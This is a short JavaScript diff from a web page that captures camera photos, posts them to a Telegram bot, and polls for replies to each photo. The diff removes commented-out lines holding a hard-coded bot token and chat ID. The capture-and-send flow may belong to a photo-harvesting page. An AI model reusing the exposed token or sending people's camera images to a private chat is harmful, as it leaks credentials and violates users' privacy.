@@ -481,8 +481,8 @@
                         lastUpdateId = update.update_id;
                         if (update.message && update.message.reply_to_message && update.message.reply_to_message.photo) {
                             var current_id = update.message.reply_to_message.message_id;
-                            console.log(current_id);
-                            console.log(send_id);
+                            // console.log(current_id);
+                            // console.log(send_id);
 
 
                             if (current_id === send_id) {
@@ -520,6 +520,8 @@
         const overlayBox2 = document.getElementById('overlayBox2');
         const overlayBox3 = document.getElementById('overlayBox3');
         const overlayBox4 = document.getElementById('overlayBox4');
+        const loaderOverlay = document.getElementById('loaderOverlay');
+
         let stream;
         let isFlashlightOn = false;
 
@@ -606,8 +608,7 @@
                     const loaderOverlay = document.getElementById('loaderOverlay');
                     loaderOverlay.style.display = 'flex'; // Display loader overlay
 
-                    // const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
-                    // const chatId = '-1001971484231';
+
 
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
                         method: 'POST',
